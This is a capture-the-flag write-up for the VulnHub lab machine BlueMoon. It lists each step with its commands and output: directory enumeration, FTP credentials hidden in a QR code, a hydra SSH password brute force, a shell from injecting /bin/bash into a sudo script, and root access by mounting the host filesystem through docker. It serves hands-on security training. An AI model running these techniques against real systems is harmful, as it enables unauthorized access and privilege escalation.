@@ -1,0 +1,48 @@
+Writeup Vulhub BlueMoon
+IP : 192.168.88.194
+Link : https://www.vulnhub.com/entry/bluemoon-2021,679/
+Goal : Got user1.txt, user2.txt , and root.txt
+
+
+1. Scan ip address with netdiscover : sudo netdiscover -i eth0 -r 192.168.88.0./24 and got ip 192.168.88.194
+
+2. Scan dir with gobuster : apt-get install gobuster (to get gobuster)
+Command : gobuster dir -u http://192.168.88.194 -x php,txt,html --wordlist ~/Downloads/directory-list-2.3-medium.txt -o blues.gobuster  
+Output :  
+/index.html           (Status: 200) [Size: 383]
+/server-status        (Status: 403) [Size: 279]
+/hidden_text          (Status: 200) [Size: 1169]
+
+3. Go to http://192.168.88.194/hidden_text 
+
+4. And got te qr code : http://192.168.88.194/.QR_C0d3.png
+
+5. zbarimmg .QR_C0d3.png 
+Output : 
+HOST=ip
+USER=userftp
+PASSWORD=ftpp@ssword
+
+6. ftp 192.168.88.194
+ftp> get information.txt 
+ftp> get p_list.txt
+
+7. Bruteforce password ssh with user robin :
+Command = hydra -l robin -P p_list.txt 192.168.88.194 ssh
+Output  : Got password k4rv3ndh4nh4ck3r
+[DATA] attacking ssh://192.168.88.194:22/
+[22][ssh] host: 192.168.88.194   login: robin   password: k4rv3ndh4nh4ck3r
+1 of 1 target successfully completed, 1 valid password found
+
+8. ssh robin@192.168.88.194; cat user1.txt, got flag : Fl4g{u5er1r34ch3d5ucc355fully}
+
+9. cd projects; sudo -u jerry ./feedback.sh (Isi sakarepmu sing penting isi feedback /bin/bash)
+
+10. To get shell you must : python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+11. cat user2.txt, got flag : Fl4g{Y0ur34ch3du53r25uc355ful1y}
+
+12. check id, and user id is docker, and now we must run (oiyo, ojo lali di cek yo cuy images docker re): 
+Command = docker run -it -v /:/mnt alpine
+
+13. cd mnt/root; cat root.txt, got flag : Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
